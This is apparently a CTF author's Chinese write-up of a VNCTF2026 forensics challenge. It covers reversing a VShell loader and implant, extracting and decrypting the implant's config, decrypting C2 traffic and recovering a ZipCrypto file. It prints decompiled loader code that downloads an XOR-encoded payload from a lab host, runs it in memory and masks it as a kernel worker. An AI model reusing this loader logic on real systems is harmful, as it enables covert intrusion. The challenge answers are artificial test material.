---
title: V(N)Shell 出题小记
link: v-n-shell
sticky: false
catalog: true
tocNumbering: true
excludeFromSummary: false
date: 2026-02-03 13:16:32
categories:
  - ['CTF']
tags:
  - CTF
  - VNCTF2026
  - VShell
description: 这次VNCTF2026上出这道题目的一些记录以及详细的解题wp
cover: /img/cover/girlfriend2.jpg

updated: 2026-02-03 13:22:59
---
# V(N)shell 出题小记

> 出题思路
php 一句话木马->stage1->stage2->zip2json

## 环境准备

VShell 监听：

* mode: `TCP`

* Listen_addr: `0.0.0.0:11451`

* Vkey:`We1c0nn3_t0_VNctf2O26!!!`

* Salt:`It_is_my_secret!!!`

Virtualbox Kali linux

单网卡：Host-only:`192.168.56.103`

桌面有个 VIP_file，内容是`Welcome to the V&N family`

## 具体流程

先访问 8000,随便点几个，水水流量包，然后发送这个 gift 文件（得隐蔽点），再随便传递一些垃圾文件

接着我触发 sh 文件运行 stage1，成功上线，然后随便执行命令，用 zip 加密了一个文件，并用 zip2john 提取对应的 pk 哈希值，需要恢复内容（强网拟态决赛遇到的知识点，真感觉不错

## Wp

> tips:
本次出题大部分借鉴
[How AI Kills the VShell](https://github.com/Esonhugh/How-AI-Kills-the-VShell/tree/Skyworship)

### 提取 stage1,stage2

初步打开流量包分析，看到 shell.php 执行了一些系统命令，过滤分析

```bash
http.request.uri contains "shell.php"
```

可以看到我传递了一些文件，最后执行了`bash open`

![BlockNote image](/img/VNshell/2026-01-26-10-24-20-image.png)

先分析 open 文件

```bash
http contains "open"
```

追踪到这个 open 是一个 sh 脚本文件，作用是执行 gift 程序，已经可以猜测到了，这里的 gift 就是 stage1 加载器

将 gift 导出，并用 ida 进行逆向分析

对 main 函数进行反编译，了解加载器主要逻辑

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  struct hostent *v3; // rax
  in_addr_t v4; // eax
  int v5; // eax
  int v6; // ebx
  int v7; // r12d
  int v8; // edx
  _BYTE *v9; // rax
  __int64 v10; // rcx
  _DWORD *v11; // rdi
  _BYTE buf[2]; // [rsp+2h] [rbp-1476h] BYREF
  int optval; // [rsp+4h] [rbp-1474h] BYREF
  char *argva[2]; // [rsp+8h] [rbp-1470h] BYREF
  sockaddr addr; // [rsp+1Ch] [rbp-145Ch] BYREF
  char name[33]; // [rsp+2Fh] [rbp-1449h] BYREF
  char resolved[1024]; // [rsp+50h] [rbp-1428h] BYREF
  _BYTE v19[4136]; // [rsp+450h] [rbp-1028h] BYREF

  if ( !access("/tmp/log_de.log", 0) )
    exit(0);
  qmemcpy(name, "192.168.56.1", sizeof(name));
  *(_QWORD *)&addr.sa_family = 3140222978LL;
  *(_QWORD *)&addr.sa_data[6] = 0;
  v3 = gethostbyname(name);
  if ( v3 )
    v4 = **(_DWORD **)v3->h_addr_list;
  else
    v4 = inet_addr(name);
  *(_DWORD *)&addr.sa_data[2] = v4;
  v5 = socket(2, 1, 0);
  v6 = v5;
  if ( v5 >= 0 )
  {
    optval = 10;
    setsockopt(v5, 6, 7, &optval, 4u);
    while ( connect(v6, &addr, 0x10u) == -1 )
      sleep(0xAu);
    send(v6, "l64   ", 6u, 0);
    buf[0] = addr.sa_data[0];
    buf[1] = addr.sa_data[1];
    send(v6, buf, 2u, 0);
    send(v6, name, 0x20u, 0);
    v7 = syscall(319, "a", 0);
    if ( v7 >= 0 )
    {
      while ( 1 )
      {
        v8 = recv(v6, v19, 0x1000u, 0);
        if ( v8 <= 0 )
          break;
        v9 = v19;
        do
          *v9++ ^= 0x99u;
        while ( (int)((_DWORD)v9 - (unsigned int)v19) < v8 );
        write(v7, v19, v8);
      }
      v10 = 1024;
      v11 = v19;
      while ( v10 )
      {
        *v11++ = 0;
        --v10;
      }
      close(v6);
      realpath(*argv, resolved);
      setenv("CWD", resolved, 1);
      argva[0] = "[kworker/0:2]";
      argva[1] = 0;
      fexecve(v7, argva, _bss_start);
    }
  }
  return 0;
}
```

简而言之，就是加载器会连接远程服务器下载 stage2 主木马，在下载过程中，会对数据进行`0x99`异或

先划拉到执行`bash open`那里，下面会看到受害机器与新的端口进行握手，然后就是传递 stage2，其实已经可以锁定第二题答案了，就是`192.168.56.1:11451`

![BlockNote image](/img/VNshell/2026-01-26-11-20-05-image.png)

对 stage1 仔细分析的话，会明白，加载器会先传递 l64 和监听地址等信息，然后接收异或数据

提取出来 stage2 后继续逆向分析

### 提取 config

#### 方法一

具体程序逻辑还是参照上面提供的 github 仓库链接，那位大佬描述的很清晰

至于 config 如何提取，我有小技巧

> 手撕两天 GO 汇编，re 手还是太辛苦了

在汇编里面直接搜索`5000h`就能找到加密`config`存放的位置（我观察了老久了，发现 vshell 的任何模式对于 config 的加密数据，最后都是生成 5000h 大小，也就是 20480 字节的空间存储

![BlockNote image](/img/VNshell/2026-01-26-11-44-53-image.png)

观察到这个大小的字节被`sub_598F00`函数调用，可以直接了解到加密逻辑（逆向起来如果有点吃力的话，可以继续参考仓库，里面描述了，config 的解密逻辑是通过 `aes_cbc_pkcs7_decrypt`模式解密，其中 key 与 iv 均为该配置块的前 16 字节，最后通过 `JSON Unmarshal` 进行反序列化。

先提取加密信息

```python
import idc
import os

def extract_binary_data(start_addr, size, output_file):
    try:
        if isinstance(start_addr, str):
            start_addr = int(start_addr, 16)

        print(f"开始提取数据...")
        print(f"起始地址: 0x{start_addr:X}")
        print(f"数据大小: {size} 字节")
        print(f"结束地址: 0x{start_addr + size:X}")
        print(f"输出文件: {output_file}")

        if start_addr == idaapi.BADADDR:
            print("错误: 无效的起始地址")
            return False

        max_addr = idaapi.get_fileregion_ea(0)
        if start_addr + size > max_addr:
            print(f"警告: 提取范围可能超出文件边界")
            print(f"文件最大地址: 0x{max_addr:X}")

        data = idaapi.get_bytes(start_addr, size)

        if data is None:
            print("错误: 无法读取指定地址的数据")
            return False
        with open(output_file, 'wb') as f:
            f.write(data)

        print(f"成功提取 {len(data)} 字节到 {output_file}")
        print(f"\n统计信息:")
        print(f"提取的字节数: {len(data)}")


        return True

    except Exception as e:
        print(f"提取过程中发生错误: {e}")
        return False

def main():
    start_addr = 0x8C6339  
    size = 20480        
    output_file = "extracted_data.bin"

    success = extract_binary_data(start_addr, size, output_file)

    if success:
        print(f"\n提取完成！文件已保存为: {os.path.abspath(output_file)}")
    else:
        print("提取失败")


if __name__ == "__main__":
    main()
```

这里用 ida 跑脚本还是蛮方便的

接下来对 config 解密

这是我的解密脚本(我发现这里并不像仓库说的，用 pkcs7 填充，因为数据后面全是 0,就当 vshell 开发者使用 0 填充的 config 信息然后进行加密)

```python
from Crypto.Cipher import AES
import json

def remove_zero_padding(data):
    """移除零填充 - 去掉末尾的所有0x00字节"""
    end_pos = len(data)
    while end_pos > 0 and data[end_pos-1] == 0:
        end_pos -= 1
    return data[:end_pos]

def decrypt_embedded_config():
    """解密嵌入的配置数据"""
    
    input_file = "/home/yolo/下载/extracted_data.bin"
    with open(input_file, "rb") as f:
        encrypted_data = f.read()
    
    print(f"加密数据总大小: {len(encrypted_data)} 字节")
    
    # 提取密钥和IV（前16字节）
    key_iv = encrypted_data[:16]
    print(f"密钥/IV: {key_iv.hex()}")
    
    # 实际的加密数据（从第17字节开始）
    actual_encrypted = encrypted_data[16:]
    print(f"实际加密数据大小: {len(actual_encrypted)} 字节")
    
    # AES-CBC解密
    cipher = AES.new(key_iv, AES.MODE_CBC, key_iv)
    decrypted_raw = cipher.decrypt(actual_encrypted)
    
    print(f"原始解密数据大小: {len(decrypted_raw)} 字节")
    
    # 尝试移除零填充（根据你的输出，数据末尾有很多0x00）
    decrypted = remove_zero_padding(decrypted_raw)
    print(f"去除零填充后大小: {len(decrypted)} 字节")
    
    try:
        decoded_str = decrypted.decode('utf-8')
        print("✅ 成功解码为UTF-8")
        
        # 尝试解析为JSON
        try:
            config = json.loads(decoded_str)
            print("✅ 成功解析为JSON")
            
            # 保存JSON文件
            with open("decrypted_config.json", "w", encoding="utf-8") as f:
                json.dump(config, f, indent=2, ensure_ascii=False)
            print("✅ 已保存到: decrypted_config.json")
            
            print("\n配置内容:")
            for key, value in config.items():
                print(f"  {key}: {value}")
                
            return config
            
        except json.JSONDecodeError:
            print("⚠️ 不是JSON格式，保存为文本文件")
            with open("decrypted_text.txt", "w", encoding="utf-8") as f:
                f.write(decoded_str)
            print("✅ 已保存到: decrypted_text.txt")
            
            print(f"\n文本内容前500字符:")
            print(decoded_str[:500])
            
    except UnicodeDecodeError:
        print("❌ 不是有效的UTF-8，保存为二进制文件")
        with open("decrypted_binary.bin", "wb") as f:
            f.write(decrypted)
        print("✅ 已保存到: decrypted_binary.bin")
        
        print(f"\n十六进制预览（前200字节）:")
        print(decrypted[:200].hex())

if __name__ == "__main__":
    decrypt_embedded_config()
```

解密后成功拿到第三问答案`It_is_my_secret!!!`

#### 方法二

在 ida 中进行分析，应该不难全局查找 json 字符（通过文章可以清楚，最后解密出来的信息是段 json 序列

随意点击一个

![image-20260131200833706](/img/VNshell/image-20260131200833706.png)

通过交叉引用，选中`call encoding_json_Unmarshal`（我选的第二行那个，相对来说最早调用的

![image-20260131200959903](/img/VNshell/image-20260131200959903.png)

查看它的地址`0x598FB8`

![image-20260131201118244](/img/VNshell/image-20260131201118244.png)

> 在获取这个地址的时候，可以稍微对上下程序分析，大致逻辑是**读取密文->调用解密函数->得到明文->解析 JSON 到结构体**
> 这里的`encoding_json_Unmarshal`就是最后一步

然后上 gdb 可以打个断点直接获取(pwngdb 完全可以一把梭)

```bash
pwndbg> b *0x598FB8
Breakpoint 1 at 0x598fb8
pwndbg> run
Starting program: /home/yolo/下载/download.elf 
[New LWP 300055]
[New LWP 300056]
[New LWP 300058]
[New LWP 300057]

Thread 1 "download.elf" hit Breakpoint 1, 0x0000000000598fb8 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────
Breakpoint hit at 0x598fb8
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────
 RAX  0xc0001b1000 ◂— '{"server":"192.168.56.1:11451","type":"tcp","vkey":"We1c0nn3_t0_VNctf2O26!!!","proxy":"","salt":"It_is_my_secret!!!","l":false,"e":false,"d":30,"h":10}'
 RBX  0x97
 RCX  0x4ff0
 RDX  0
 RDI  0x8081a0 ◂— 8
 RSI  0xc00018c070 ◂— 0
 R8   0xc0001b1000 ◂— '{"server":"192.168.56.1:11451","type":"tcp","vkey":"We1c0nn3_t0_VNctf2O26!!!","proxy":"","salt":"It_is_my_secret!!!","l":false,"e":false,"d":30,"h":10}'
 R9   0
 R10  0x10
 R11  0x10
 R12  0xc000026260 ◂— 0x18b63140574269ac
 R13  0x10
 R14  0xc0000061a0 —▸ 0xc0000c2000 ◂— 0
 R15  0x10
 RBP  0xc0000c3e08 —▸ 0xc0000c3f58 —▸ 0xc0000c3f70 —▸ 0xc0000c3fd0 ◂— 0
 RSP  0xc0000c3dc8 —▸ 0xc0001b1000 ◂— '{"server":"192.168.56.1:11451","type":"tcp","vkey":"We1c0nn3_t0_VNctf2O26!!!","proxy":"","salt":"It_is_my_secret!!!","l":false,"e":false,"d":30,"h":10}'
 RIP  0x598fb8 ◂— call 0x5564e0
─────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────
 ► 0x598fb8    call   0x5564e0                    <0x5564e0>
 
   0x598fbd    nop    dword ptr [rax]
   0x598fc0    test   rax, rax
   0x598fc3    je     0x599027                    <0x599027>
 
   0x598fc5    nop   
   0x598fc6    lea    rax, [rip + 0x2aa6f3]     RAX => 0x8436c0 ◂— 0x10
   0x598fcd    call   0x40ce80                    <0x40ce80>
 
   0x598fd2    mov    qword ptr [rax + 8], 0xa
   0x598fda    lea    rcx, [rip + 0x30c21a]           RCX => 0x8a51fb ◂— 0x65206769666e6f63 ('config e')
   0x598fe1    mov    qword ptr [rax], rcx
   0x598fe4    mov    rsi, qword ptr [rsp + 0x38]
───────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ rsp 0xc0000c3dc8 —▸ 0xc0001b1000 ◂— '{"server":"192.168.56.1:11451","type":"tcp","vkey":"We1c0nn3_t0_VNctf2O26!!!","proxy":"","salt":"It_is_my_secret!!!","l":false,"e":false,"d":30,"h":10}'
01:0008│-038 0xc0000c3dd0 ◂— 0x4ff0
02:0010│-030 0xc0000c3dd8 ◂— 0x4ff0
03:0018│-028 0xc0000c3de0 —▸ 0x94eeb0 ◂— 0
04:0020│-020 0xc0000c3de8 —▸ 0xc0000c3e58 ◂— 0
05:0028│-018 0xc0000c3df0 ◂— 0x5000
06:0030│-010 0xc0000c3df8 —▸ 0xc0001ac000 ◂— 0x18b63140574269ac
07:0038│-008 0xc0000c3e00 —▸ 0xc00018c070 ◂— 0
─────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
 ► 0         0x598fb8 None
   1     0xc0001b1000 None
   2           0x4ff0 None
   3           0x4ff0 None
   4         0x94eeb0 None
   5     0xc0000c3e58 None
   6           0x5000 None
   7     0xc0001ac000 None
─────────────────────────────────────[ THREADS (5 TOTAL) ]─────────────────────────────────────
  ► 1   "download.elf" stopped: 0x598fb8
    5   "download.elf" stopped: 0x403c4e
    4   "download.elf" stopped: 0x45dcd2
    3   "download.elf" stopped: 0x45dc63
Not showing 1 thread(s). Use set context-max-threads <number of threads> to change this.
───────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/20gx $rsp
0xc0000c3dc8:	0x000000c0001b1000	0x0000000000004ff0
0xc0000c3dd8:	0x0000000000004ff0	0x000000000094eeb0
0xc0000c3de8:	0x000000c0000c3e58	0x0000000000005000
0xc0000c3df8:	0x000000c0001ac000	0x000000c00018c070
0xc0000c3e08:	0x000000c0000c3f58	0x00000000007de458
0xc0000c3e18:	0x0000000000000000	0x0000000000000000
0xc0000c3e28:	0x0000000000000000	0x0000000000000000
0xc0000c3e38:	0x0000000000000000	0x0000000000000000
0xc0000c3e48:	0x0000000000000000	0x0000000000000000
0xc0000c3e58:	0x0000000000000000	0x0000000000000000
pwndbg> x/s 0x000000c0001b1000
0xc0001b1000:	"{\"server\":\"192.168.56.1:11451\",\"type\":\"tcp\",\"vkey\":\"We1c0nn3_t0_VNctf2O26!!!\",\"proxy\":\"\",\"salt\":\"It_is_my_secret!!!\",\"l\":false,\"e\":false,\"d\":30,\"h\":10}"
pwndbg> 
```

### 解密流量

接下来可以继续进行逆向分析，拿到流量加密过程中的逻辑

这里也有小技巧，C2 加密通信中，`client`是有很大概率出现在主逻辑中的，直接在汇编中搜索即可

逐个判断，锁定`sub_6D7E40`

审计的时候注意下这里，主木马建立通信时，会先检测 vkey 然后进行后续操作，否则直接退出

后面可以继续进行交叉引用逆向分析流量加密逻辑，这里直接将仓库的结论拿过来：

密文通过`AES GCM`模式加密，`nonce`为 IV，密钥为`salt`的`md5`值

这里再描述下流量包的格式(随机选取了一个稍微长点的流)

![image-20260129002816067](/img/VNshell/image-20260129002816067.png)

* `d7000000`这四个字节没有用（所有加密流量开头都有这样四个字节：几乎都是一个非 0 和 3 个 0 组成，作用应该就是流量之间的分割

* `a79b3b8a06961ff983a5d121`这 12 个字节就是`nonce`，在加密中充当`IV`

* `0656681ae1c～faeba0499f78d4`中间数据长度没有限制，是密文

* `d057c90912184e3f0daef1bb6d20a21a`最后面这 16 个字节是垃圾数据，直接扔了

通过上述结论，可以写出一个简易的单条流量解密脚本

```python
import hashlib
import struct
import re
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_c2_data(salt, hex_payload):
    key_hex = hashlib.md5(salt.encode()).hexdigest()
    key = key_hex.encode('ascii')
    aesgcm = AESGCM(key)

    data = bytes.fromhex(hex_payload.replace("\n", "").replace(" ", ""))
    msg_len = struct.unpack('<I', data[:4])[0]
    content = data[4:4+msg_len]
    
    nonce = content[:12]
    ciphertext_with_tag = content[12:]

    try:
        plaintext = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
        
        print(f"🔓 解密成功 (原始长度 {len(plaintext)} 字节):")

        text = plaintext.decode('utf-8', errors='replace')

        cleaned_text = text.strip('\x00').strip()
        
        ansi_escape = re.compile(r'(?:\x1B[@-_][0-?]*[ -/]*[@-~]|\x07)')
        final_text = ansi_escape.sub('', cleaned_text)

        if final_text:
            print("-" * 30)
            print(f"📄 识别到的文本/命令:\n{final_text}")
            print("-" * 30)
        else:
            print("📄 内容仅包含不可见字符或空格")
            print(f"原始 Hex 末尾: {plaintext[-20:].hex()}")

        return plaintext
    except Exception as e:
        print(f"❌ 解密失败: {e}")
        return None
SALT = "It_is_my_secret!!!"

data_1 = "2a0100009f0469cacfd2f08d092cbb1c0de3f66d807f3e3b3407e02afc077ef4f7263900e78c97461a8367aac05f0dbe2c84bb44e8c0ff007a9f2afd97858d0eb83b9e712107c142f4a30e0e8e1ebc1c4754a142ed60d777c52a7d5a057ddb910796bd4903acd776c18603c0b4e7741972d96d8ad422904ffa0a2aa4105289439e5c1a0aa351fc75fd4fac22c5058ed379484a4858f2c1c8e0621f27d392026e5abd69f8eff6b6b16db272d3cdaa24af3ce7f6fb1260721033ec9c1d664b5c55e58307cf2814d6f2dce639ebf3566e81141ee0a9fb91c292350b5405d327ca30dadba0c285a1140d29362db2adec41e80ff497f1e5979aa7bfdb42699340e4f309c6b8cfbf8eaf726da31028dbd9c2e6856fae283338ce6631e859026a09e73557ee028656600a67d27a0e3220cd"

print("--- 尝试解密第一条 (Client -> Server) ---")
decrypt_c2_data(SALT, data_1)

"""运行结果
python vshellstudy.py
🔓 解密成功 (原始长度 270 字节):
------------------------------
📄 识别到的文本/命令:
{"ConnType":"v","Host":"v","LocalProxy":false,"RemoteAddr":"v","Req":{"Pass":"v","Type":"M","File":null,"Z1":"zip -9 -e -P \"White_hat\" /home/kali/Desktop/VIP.zip VIP_file/home/kali/Desktop/VIP_file","Z2":"","Z3":"","Z4":"","Z5":""},"Option":{"Timeout":5000000000}}
------------------------------

"""
```

第四题答案出来了，桌面那个 VIP.zip 压缩包的密码是`White_hat`

也可以用仓库的解密脚本一把梭，在后续的解密流程中，我们会拿到一组 pkzip 哈希

```hash
VIP.zip/VIP_file:$pkzip$1*2*2*0*25*19*2d251cff*0*42*0*25*61e5*1450b3d5736810d8558fa09c3cd1a3c266783e74d767319ed479288f25e35ad3085ee4bba9*$/pkzip$:VIP_file:VIP.zip::VIP.zip
```

第五个问题是 VIP_file 的内容是什么，这里考察了如何通过`zip2john`得到的哈希去恢复压缩包内容，实现要求是需要压缩包的密码(明文攻击得到的 keys 也可以)，以及压缩包必须是`zipcrypto`加密

这里可以参考[buckeyectf2025-zip2johnzip 的题解](https://github.com/cscosu/buckeyectf-2025-public/blob/master/forensics/zip2john2zip/solve/solve.py)去解决，解密脚本如下

```python
#!/usr/bin/env python3

def pkcrc(x, b):
    x = (x ^ b) & 0xFFFFFFFF 
    for _ in range(8):
        if x & 1:
            x = (x >> 1) ^ 0xedb88320
        else:
            x = x >> 1
            
    return x & 0xFFFFFFFF


def decrypt_stream(encrypted_data, password):
    """
    Decrypts a raw stream of ZipCrypto-encrypted bytes.
    """
    key0 = 0x12345678
    key1 = 0x23456789
    key2 = 0x34567890

    def _update_keys(byte_val):
        nonlocal key0, key1, key2
        key0 = pkcrc(key0, byte_val)
        
        temp = (key1 + (key0 & 0xff)) & 0xFFFFFFFF
        key1 = (((temp * 0x08088405) & 0xFFFFFFFF) + 1) & 0xFFFFFFFF
        
        key2 = pkcrc(key2, (key1 >> 24) & 0xff)

    def _get_keystream_byte():
        nonlocal key2
        # This part generates the 1-byte keystream from key2
        temp = (key2 & 0xFFFF) | 3
        return (((temp * (temp ^ 1)) & 0xFFFF) >> 8) & 0xff

    # Initialize keys with the password
    for byte_val in password:
        _update_keys(byte_val)
    
    # Decrypt the data
    decrypted = bytearray()
    for encrypted_byte in encrypted_data:
        keystream_byte = _get_keystream_byte()
        decrypted_byte = encrypted_byte ^ keystream_byte
        decrypted.append(decrypted_byte)
        _update_keys(decrypted_byte)
        
    return bytes(decrypted)

def parse_pkzip_hash(hash_string):
    if ":$pkzip$" in hash_string:
        hash_part=hash_string.split(":$pkzip$")[1]
    else:
        hash_part=hash_string

    hash_part=hash_part.split("*$/pkzip$")[0]+"*"
    parts=hash_part.split('*')
    encrypted_hex=parts[-2]
    print(f"\nEncrypted hex:{encrypted_hex}")
    return bytes.fromhex(encrypted_hex)


if __name__ == "__main__":
    hash = open("./ziphash").read().strip()
    password = b"White_hat" # just throw hash at hashcat / rockyou.txt
    enc=parse_pkzip_hash(hash)
    #enc = bytes.fromhex(hash.split('*')[13])
    print(decrypt_stream(enc,password)[12:])
"""
➜  vnctf cat ziphash                     
VIP.zip/VIP_file:$pkzip$1*2*2*0*25*19*2d251cff*0*42*0*25*61e5*1450b3d5736810d8558fa09c3cd1a3c266783e74d767319ed479288f25e35ad3085ee4bba9*$/pkzip$:VIP_file:VIP.zip::VIP.zip
➜  vnctf python zipjohn.py

Encrypted hex:1450b3d5736810d8558fa09c3cd1a3c266783e74d767319ed479288f25e35ad3085ee4bba9
b'Welcome to the V&N family'

"""
```

第五题答案参上，本题 Solve
